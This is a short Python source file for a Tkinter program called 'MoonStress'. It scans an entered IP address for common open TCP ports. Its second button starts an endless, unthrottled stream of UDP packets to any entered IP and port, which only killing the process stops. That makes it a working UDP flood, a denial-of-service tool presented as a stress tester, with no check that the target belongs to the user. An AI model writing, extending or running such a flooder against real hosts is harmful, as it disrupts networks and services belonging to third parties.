import tkinter as tk
import socket
import threading
import tkinter.messagebox as mbox
from tkinter import ttk

class MoonStress:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("MoonStress")
        self.window.configure(bg='black')

        # label1
        self.label1 = ttk.Label(self.window, text="Enter IP to check for ports:", foreground='white', background='black', font=('Helvetica', 12))
        self.label1.grid(row=0, column=0, padx=10, pady=10, sticky='w')

        # ip_entry
        self.ip_entry = ttk.Entry(self.window)
        self.ip_entry.grid(row=0, column=1, padx=10, pady=10, sticky='w')

        # port_check_button
        self.port_check_button = ttk.Button(self.window, text="Check open ports", style='Custom.TButton', command=self.check_open_ports)
        self.port_check_button.grid(row=1, column=0, padx=10, pady=10, sticky='w')

        # label2
        self.label2 = ttk.Label(self.window, text="Enter IP address:", foreground='white', background='black', font=('Helvetica', 12))
        self.label2.grid(row=2, column=0, padx=10, pady=10, sticky='w')

        # ip_entry2
        self.ip_entry2 = ttk.Entry(self.window)
        self.ip_entry2.grid(row=2, column=1, padx=10, pady=10, sticky='w')

        # label3
        self.label3 = ttk.Label(self.window, text="Enter port:", foreground='white', background='black', font=('Helvetica', 12))
        self.label3.grid(row=3, column=0, padx=10, pady=10, sticky='w')

        # port_entry
        self.port_entry = ttk.Entry(self.window)
        self.port_entry.grid(row=3, column=1, padx=10, pady=10, sticky='w')

        # stress_test_button
        self.stress_test_button = ttk.Button(self.window, text="Infinitely send UDP packets \n (Taskkill to stop)", style='Custom.TButton', command=self.stress_test)
        self.stress_test_button.grid(row=4, column=0, padx=10, pady=10, sticky='w')

        # create a custom style for the buttons
        button_style = ttk.Style()
        button_style.configure('Custom.TButton', foreground='black', background='blue', borderwidth=0, relief='flat', font=('Helvetica', 12), padding=5, width=20)

        # run the main loop
        self.window.mainloop()



    def check_open_ports(self):
        ip_address = self.ip_entry.get()
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995]
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip_address, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        if len(open_ports) > 0:
            msg = "The open ports are: " + str(open_ports)
        else:
            msg = "Tough look! No open ports."
        tk.messagebox.showinfo("Any open ports there!?", msg)

    def stress_test(self):
        ip_address = self.ip_entry2.get()
        port = int(self.port_entry.get())
        thread = threading.Thread(target=self.send_udp_packets, args=(ip_address, port))
        thread.start()
        tk.messagebox.showinfo("UDP Packets", "UDP Packets are being sent infinitly (If your internet is slowing down it is due to the rapid UDP sending). To stop taskkill the program.")

    def send_udp_packets(self, ip_address, port):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"AAAAAA", (ip_address, port))
            except:
                pass


if __name__ == "__main__":
    tester = MoonStress()
